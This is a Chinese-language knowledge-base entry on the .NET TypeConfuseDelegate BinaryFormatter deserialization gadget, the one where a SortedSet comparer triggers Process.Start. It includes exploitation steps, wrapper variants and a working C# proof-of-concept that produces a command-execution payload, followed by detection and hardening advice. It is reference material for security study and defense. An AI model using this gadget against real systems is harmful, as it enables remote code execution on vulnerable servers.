---
id: web-dotnet-deser-typeconfusedelegate-sortedset-delegate-confusion
title: TypeConfuseDelegate：Comparer<string>.Create 混淆多播委托调用列表，SortedSet 反序列化时经 Compare 调用 Process.Start（.NET 4.5+）
type: scenario
domain: web
path: web/dotnet/deserialization
technique: typeconfusedelegate-sortedset-delegate-signature-confusion
tags:
- dotnet
- binaryformatter
- deserialization
- typeconfusedelegate
- sortedset
- delegate
- comparer
- gadget
- rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V670
  verified_at: '2026-11-13T10:13:44+08:00'
  notes: 已对照 img25 流程图与 img26 ysoserial 代码核对 Comparison<string>/MulticastDelegate.Combine/Comparer<string>.Create/SortedSet/_invocationList 替换 Process.Start 及 .NET 4.5+ 条件；未复现。
url: /docs/web/dotnet/deserialization/web-dotnet-deser-typeconfusedelegate-sortedset-delegate-confusion/
draft: false
kb_aliases:
- TypeConfuseDelegate
- SortedSet gadget
- Comparer<string>.Create
- 委托类型混淆
- MulticastDelegate _invocationList
- Process.Start Comparison delegate
- ysoserial TypeConfuseDelegate
---

## 一句话结论

`Comparison<string>`（`String.Compare`）与 `Func<string,string,Process>`（`Process.Start`）参数表兼容，攻击者用 `MulticastDelegate.Combine` 组合委托后反射把 `_invocationList[1]` 替换成 `Process.Start`，再让 `Comparer<string>.Create` 包装它并塞进 `SortedSet<string>`；反序列化时 `SortedSet.OnDeserialization` 调用 `Add` → `Compare`，多播委托随即以两个 string 参数调用 `Process.Start(文件名, 参数)` 执行命令。该链要求 .NET Framework 4.5+（`Comparer<T>.Create` 自 4.5 引入）。

## 原理

- **委托类型混淆**：.NET 委托是"对象 + 方法指针 + 签名"；`Comparison<string>` 与 `Func<string,string,Process>` 的签名都是"两个 string 参数"，仅返回类型不同，而运行时对委托调用只校验参数个数/类型，不校验返回语义。把 `Process.Start(string fileName, string arguments)` 绑定成 `Func<string,string,Process>` 后与 `String.Compare(string,string)` 组成多播委托，调用时两者会依次执行。
- **构造 gadget**（文章 img26）：
  1. `Delegate da = new Comparison<string>(String.Compare);`
  2. `Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(da, da);`（得到含 2 个相同委托的多播委托）
  3. `IComparer<string> comp = Comparer<string>.Create(d);`（.NET 4.5+ 新增，把委托包装成比较器）
  4. `SortedSet<string> set = new SortedSet<string>(comp); set.Add(cmdFile); set.Add(cmdArgs);`
  5. 反射取 `typeof(MulticastDelegate).GetField("_invocationList", NonPublic)`，把 `d.GetInvocationList()` 的第 2 个元素替换为 `new Func<string,string,Process>(Process.Start)`，再 `SetValue` 写回。
- **反序列化触发**（文章 img25）：SortedSet 的反序列化回调 `OnDeserialization` 会调用 `Add` 重建集合，`Add` 经多次重载调用比较器的 `Compare()`；此时多播委托第 1 个调用是 `String.Compare`（比较结果被丢弃/忽略），第 2 个调用就是 `Process.Start(cmd.exe, /c <命令>)`，命令执行。
- **外层载体**：BinaryFormatter 直接反序列化该 SortedSet 即可；LosFormatter/ObjectStateFormatter 场景下可经 `ClaimsPrincipal`（`OnDeserializedMethod` → `DeserializeIdentities` → `m_serializedClaimsIdentities` base64 → BinaryFormatter）、`GenericPrincipal + ClaimsPrincipal`（更通用的封装）、`ResourceSet`（反序列化时触发内部 SortedSet 的 `OnDeserialization`）等外层对象带入。
- **为什么成立**：反序列化必须重建集合并重新排序，排序必然调用攻击者指定的比较器；比较器里的委托链在 `_invocationList` 被替换后已不是"纯比较函数"，而是一个能触达 `Process.Start` 的多播委托。

## 触发条件

- .NET Framework 4.5 及以上（`Comparer<T>.Create` 存在；文章明确指出低版本 dotnet 无法利用）。
- 存在可控制序列化流的 BinaryFormatter 入口，或经 ClaimsPrincipal/GenericPrincipal/ResourceSet 等载体进入。
- 反序列化端未禁用 BinaryFormatter、未做类型/委托相关白名单。

## 利用步骤

1. 按 img26 构造 `Comparison<string>` + `MulticastDelegate.Combine` + `Comparer<string>.Create` + `SortedSet<string>`，`Add` 命令文件名与参数。
2. 反射替换 `_invocationList[1]` 为 `Process.Start` 委托（`new Func<string,string,Process>(Process.Start)`）。
3. BinaryFormatter 序列化该 SortedSet（或按目标入口用 ClaimsPrincipal/GenericPrincipal/ResourceSet 包装）。
4. 投递到反序列化入口；SortedSet.OnDeserialization → Add → Compare → Process.Start，命令执行。

## PoC

```csharp
public static object TypeConfuseDelegateGadget(string cmdFileName, string cmdArgs)
{
    Delegate da = new Comparison<string>(String.Compare);
    Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(da, da);
    IComparer<string> comp = Comparer<string>.Create(d);
    SortedSet<string> set = new SortedSet<string>(comp);
    set.Add(cmdFileName);
    set.Add(cmdArgs);

    FieldInfo fi = typeof(MulticastDelegate).GetField(
        "_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
    object[] invoke_list = d.GetInvocationList();
    // 第 2 个委托会被运行时按 (string, string) 参数调用 -> Process.Start
    invoke_list[1] = new Func<string, string, Process>(Process.Start);
    fi.SetValue(d, invoke_list);
    return set;
}

// 生成：BinaryFormatter.Serialize(stream, TypeConfuseDelegateGadget("cmd.exe", "/c calc"));
```

## 变体与关联

- 变体：外层载体 `ClaimsPrincipal + TypeConfuseDelegate`（`OnDeserializedMethod` 触发内层 BinaryFormatter）、`GenericPrincipal + ClaimsPrincipal + SortedSet`（更通用的封装）、`ResourceSet + SortedSet`（反序列化触发 `OnDeserialization`）。
- 关联：[[web-dotnet-deser-textformattingrunproperties-xamlreader-odp-gadget]]（另一条最常用的内层 gadget）、[[web-dotnet-deser-losformatter-objectstateformatter-claims-identity-second-order]]（ClaimsPrincipal 载体同源）、[[web-dotnet-deser-toolboxitemcontainer-stream-field-binaryformatter]]（可把该旧 gadget 字节放入其 Stream 字段）。
- 边界：.NET 4.0 及以下没有 `Comparer<T>.Create`，不可用；.NET Core/.NET 5+ 默认禁用 BinaryFormatter。

## 检测与防御

- 检测：序列化流中出现 `SortedSet`、`Comparison`、`System.Comparison`、`Comparer` 等类型；反序列化进程出现 `SortedSet.OnDeserialization → Comparer.Compare` 后紧跟 `Process.Start`；进程派生 `cmd.exe`/`powershell.exe`。
- 修复：禁用 `BinaryFormatter` 并移除对不可信数据的原生反序列化；对反序列化入口使用 `SerializationBinder` 白名单。
- 加固：升级 .NET Framework；监控含委托/比较器类型名的序列化流；WAF/EDR 检测 `_invocationList` 篡改类特征（多播委托中混入进程启动方法）。
